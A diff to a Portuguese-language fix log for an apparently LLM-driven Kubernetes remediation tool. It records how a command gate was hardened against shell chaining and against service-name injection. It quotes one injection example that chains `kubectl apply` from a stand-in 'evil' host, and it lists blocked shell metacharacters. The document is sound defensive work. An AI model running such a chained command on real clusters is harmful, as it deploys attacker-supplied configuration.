@@ -20,7 +20,7 @@ O CI não tem lint nem formatação, então não há outro comando a rodar.
 | # | Item | IDs | Estado | Commit |
 |---|---|---|---|---|
 | 1 | Laço do orchestrator com saída e chamadas ao LLM limitadas; timeout no cliente | F01 | feito | ver `git log` |
-| 2 | Gate de comando: metacaracteres de shell, âncora, nome de serviço | F02, T04, SEC-05, SEC-06 | pendente | — |
+| 2 | Gate de comando: metacaracteres de shell, âncora, nome de serviço | F02, T04, SEC-05, SEC-06 | feito | ver `git log` |
 | 3 | CLI usa o veredito agregado de todas as camadas | F03 | pendente | — |
 | 4 | Template de CPU no mitigator | NOVO-01 | pendente | — |
 | 5 | Safety ligada no pipeline V1 (`proposed_action`) | ARQ-01, F04, SEC-04 | pendente | — |
@@ -73,3 +73,49 @@ passaram e 10 foram pulados. Status 0 nos três.
 
 **Fica para o Allan:** o valor de 60 s de timeout é um palpite razoável, não
 uma medição. Vale ajustá-lo com a latência real do modelo em uso.
+
+## Item 2 — F02/T04/SEC-05/SEC-06: gate de comando e nome de serviço
+
+**Defeito.** A allow-list do `PreExecutionValidator` usava `re.search`, sem
+âncora. Um prefixo read-only aprovava qualquer coisa encadeada depois dele:
+`kubectl get pods; kubectl apply -f http://evil/x.yaml` saía
+`AUTO_APPROVED`. Além disso, o nome de serviço vindo da telemetria ou do LLM
+era interpolado cru em `kubectl rollout undo deployment/{service}`.
+
+**Correção:**
+
+- `safety/pre_validator.py`:
+  - **Metacaracteres:** `SHELL_METACHARACTERS` (`; & | < >`, `\n`, `\r`)
+    bloqueia o comando antes de qualquer allow-list, com status `BLOCKED`.
+  - **Âncora:** os padrões de leitura e de rollout passam a usar `re.match`,
+    que casa só no início do comando.
+  - Os padrões de alto risco continuam com `re.search`, porque ali casar em
+    qualquer posição é o comportamento mais conservador.
+- `agents/mitigator.py`:
+  - `is_valid_service_name` exige um nome DNS-1123 *subdomain* com até 253
+    caracteres.
+  - **Nome inválido:** a ação sai sem comando, com risco `HIGH` e padrão
+    `invalid_service`. Sem comando, o gate não aprova e a decisão vai para um
+    humano.
+  - Todos os nomes de serviço usados em `data/` e nos snapshots já estão
+    nesse formato, e nenhum snapshot mudou.
+
+**Testes:** `tests/test_command_gate.py`, 33 testes marcados `unit`.
+
+- **Antes da correção:** 21 falharam. Os 12 que passavam eram os de
+  comportamento legítimo, que precisam continuar passando.
+- **Cenários cobertos:**
+  - 10 formas de encadeamento e redirecionamento;
+  - padrão permitido no meio do comando;
+  - 8 comandos legítimos que continuam seguros;
+  - 7 nomes de serviço inválidos e 4 válidos;
+  - o caminho de ponta a ponta: serviço injetado → mitigator → gate.
+
+**CI local:** unit 723 passaram, integration 138 passaram, suíte completa 1414
+passaram e 10 foram pulados. Status 0 nos três.
+
+**Efeito colateral aceito:** via MCP `validate_action`, qualquer comando com
+`>` ou `<` passa a ser bloqueado, por exemplo `pip install 'x>=1.0'`. É
+falhar fechado de propósito. Se o MCP precisar validar comandos com
+especificador de versão, isso pede uma regra própria, não uma brecha na
+allow-list.
